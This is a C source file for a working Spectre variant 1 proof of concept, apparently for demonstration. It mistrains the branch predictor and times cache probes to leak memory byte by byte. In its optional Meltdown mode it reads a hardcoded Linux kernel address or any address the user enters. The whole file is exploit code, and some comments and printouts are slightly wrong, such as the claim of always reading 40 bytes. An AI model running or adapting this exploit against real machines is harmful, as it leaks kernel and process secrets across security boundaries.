#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <x86intrin.h> // Required for rdtscp and clflush instructions

size_t MAX_TIME_CACHE_HIT = 80;

unsigned int array1_size = 16;
uint8_t array1[160] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16};
uint8_t array2[256 * 512];

char *secret_phrase = "The Magic Words are Squeamish Ossifrage."; // default secret phrase

int fd; // File descriptor for meltdown

//Victim function and associated variables
uint8_t cache_target; //Necessary as the victim function will be optimized out if cache_target is not a global variable
void victim_function(size_t attack_value)
{
    if (attack_value < array1_size)
        cache_target = array2[array1[attack_value] * 512]; //Indexed value speculatively read from array2 using secret value k = array1[attack_value]
}

uint8_t readMemoryByte(size_t malicious_x, bool *confident)
{
    static int results[256]; //Array for results

    int tries, i, j, k, mix_i, junk = 0; //Some variables

    size_t training_x, x; //Variables for training

    register uint64_t time1, time2; //Variables for time

    volatile uint8_t *addr; //Pointer to memory, volatile prevents compiler optimizations

    memset(results, 0, 256 * sizeof(int)); //Set all elements of results to 0

    //Try to read the memory 999 times
    for (tries = 999; tries > 0; tries--)
    {
        char buf[512]; //Buffer to read the target file for meltdown
		if (fd > 0 && pread(fd, &buf, sizeof(buf), 0) < 0) //file read, done out of order with next lines
			perror("Error reading /proc/version");

        //Flushing all array2 vals from the cache
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);  //Assembly call to flush cache line containing array2[i*512]

        //Thirty loops consisting of 5 training iterations and then 1 attack iteration
        training_x = tries % array1_size; //array1_size is 16, training_x is between 0 and 15 depending on the current try.
        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array1_size); //Flush cache line containing array1_size

            //Delay
            for (volatile int z = 0; z < 100; z++);
            
           //Set x to 1 during training or value of malicious_x during attack without using if statements
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            //If value of x was 0, then training_x ^ 0 is also zero. Keep in mind that "0 & anything" is zero.
            x = training_x ^ (x & (malicious_x ^ training_x)); //The x is used to attack the if statement.
            //The value of x is 1 during training. During the attack, the value of x is the value of malicious_x.

            //victim function call
            victim_function(x);
        }

        //Use timer to figure out value of array1[attack_value]
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255; //Causes randomization of numbers between 0 and 255
            addr = &array2[mix_i * 512];
            __sync_synchronize();
            uint64_t time1 = __rdtsc();
            junk = *addr;                    //Dereference the address
            __sync_synchronize();
            uint64_t time2 = __rdtsc() - time1;
            if (time2 <= MAX_TIME_CACHE_HIT && mix_i != array1[tries % array1_size])
                results[mix_i]++; //if cache hit (value was in cache already), then increment results[mix_i]
        }

        //Count scoring for highest and second highest for confidence level
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j]) //If results[i] is greater or equal to results[j], then make results[i] highest
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k]) //If results[i] is only higher than results[k], then make results[i] second highest
            {
                k = i;
            }
        }
    }

    results[0] ^= junk; //Necessary to prevent compiler from optimizing out junk
    (*confident) = (results[j] > results[k] * 2); //If confidence level is greater than 2 times second highest, then confident is true

    return j; //Return value assumed to be secret
}



int main(int argc, const char **argv)
{
    size_t malicious_x = (size_t)(secret_phrase - (char *)array1); // Setting malicious x to the difference between the start of the secret and the start of the array1
    //When array1 is indexed using the malicious_x, the value of array1[malicious_x] will be the value of the secret_phrase

    int i, len = strlen(secret_phrase);

    char line[256];
    printf("Enter \"yes\" to enable meltdown demo... Linux Version Information will be revealed: ");
    fgets(line, sizeof(line), stdin);

    //check if line is "yes"
    if (!strcasecmp(line, "yes\n"))
    {

        malicious_x = (size_t) ((char*) 0xffffffff81800060 - (char *)array1); //Address for Linux kernel version 4.2.0-16-generic
        len = 89;

        //Get entire line as a string
        printf("Enter desired target address, or nothing for default (Linux kernel version 4.2.0-16-generic): ");
        fgets(line, sizeof(line), stdin);

        //Check if the line is not empty
        if (line[0] != '\n')
        {
            malicious_x = (size_t) ((char *) strtoul(line, NULL, 16) - (char *)array1); //Convert string to hex and subtract the start of the array1
        }
        else
        {
            printf("Using default address for Linux kernel version 4.2.0-16-generic...\n");
            sleep(1);
        }

        //Get entire line as a string
        // line[256];
        printf("Enter desired number of characters to probe, or nothing for default (89): ");
        fgets(line, sizeof(line), stdin);

        //Check if the line is not empty
        if (line[0] != '\n')
        {
            len = atoi(line);
        }
        else
        {
            printf("Probing default of 89 characters...\n");
            sleep(1);
        }


        if ((fd = open("/proc/version", O_RDONLY)) < 0)
		    perror("Error opening /proc/version");

    }
    else
    {

        //Get entire line as a string
        // char line[256];
        printf("Enter a phrase to use as the secret: ");
        fgets(line, sizeof(line), stdin);

        //Check if the line is not empty
        if (line[0] != '\n')
        {
            secret_phrase = line;
            malicious_x = (size_t)(secret_phrase - (char *)array1);
            len = strlen(secret_phrase) - 1;
        }
        else
        {
            printf("Using default secret phrase...\n");
            sleep(1);
        }

    }

    // Get user input, convert to integer
    printf("Enter the desired max cache threshold: ");
    char line2[256];
    fgets(line2, sizeof(line), stdin);
    if (line2[0] != '\n')
    {
        MAX_TIME_CACHE_HIT = atoi(line2);
    }
    else
    {
        printf("Using default max cache threshold...\n");
        sleep(1);
    }

    uint8_t value;
    bool confident;

    //Fill array 1 with a value 
    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1;

    //variable for recovered secret
    char recovered_secret[len + 1];
    int oldLen = len;

    printf("Reading %d bytes:\n", len); //Always 40 bytes

    while (--len >= 0) //Keep reading until len is 0
    {
        printf("Attempting read at address %p --> ", (char *) ((uintptr_t) malicious_x + (uintptr_t)array1)); //Reading at malicious_x address

        value = readMemoryByte(malicious_x++, &confident); //Read memory byte at malicious_x address, then increment malicious_x by 1

        char recovered_character = value > 31 && value < 127 ? value : '?'; //If value[0] is between 32 and 127, then print it. Otherwise, print '?'

        printf("Hex Value: 0x%02X Symbol: %c     ", recovered_character, recovered_character); //If value is between 32 and 127, then print value, else print ?

        recovered_secret[oldLen - len - 1] = recovered_character; //Add value to recovered secret
        
        printf("Confidence Level: %s", confident == true ? "HIGH" : "LOW" ); //Print confidence level depending on confidence

        printf("\n"); //New line
    }

    recovered_secret[oldLen] = '\0'; //Add null terminator to end of recovered secret

    printf("\nThe recovered secret phrase is: %s\n", recovered_secret); //Print recovered secret

    return (0);
}
